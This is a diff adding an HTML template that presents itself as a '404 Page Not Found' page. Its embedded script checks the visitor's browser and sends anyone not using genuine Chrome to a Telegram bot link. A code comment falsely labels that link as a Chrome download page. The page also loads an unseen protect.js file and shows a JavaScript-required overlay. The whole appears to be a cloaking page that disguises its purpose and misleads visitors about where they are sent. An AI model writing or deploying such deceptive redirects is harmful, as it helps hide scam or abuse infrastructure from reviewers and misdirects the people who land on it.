@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page Not Found</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 50px;
+            color: #e74c3c;
+        }
+        a {
+            color: #3498db;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>404</h1>
+    <p>The page you are looking for could not be found.</p>
+    <p><a href="/">Go to Homepage</a></p>
+    <script>// Check if real Chrome (not Edge/Brave/Opera)
+const isRealChrome = () => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    return (
+        userAgent.includes('chrome') && 
+        !userAgent.includes('edg/') && 
+        !userAgent.includes('opr/') && 
+        !userAgent.includes('brave') &&
+        window.chrome !== undefined
+    );
+};
+
+    if (!isRealChrome()) {
+        window.location.href = "https://t.me/contact_262524_bot"; // Chrome डाउनलोड पेज
+    
+    throw new Error("Browser not supported");
+}</script>
+<script src="{{ url_for('static', filename='protect.js') }}"></script>
+
+<!-- Show only if JS disabled -->
+<noscript>
+<div style="position:fixed;inset:0;background:#0008;color:#fff;display:flex;align-items:center;justify-content:center;z-index:99999;font-family:system-ui,Arial,sans-serif">
+    <div style="max-width:640px;padding:24px;background:#111;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.4)">
+        <h2 style="margin:0 0 8px">JavaScript required</h2>
+        <p style="margin:0">Is site par content protect ke liye JavaScript on hona zaroori hai.</p>
+    </div>
+</div>
+</noscript>
+</body>
+</html>
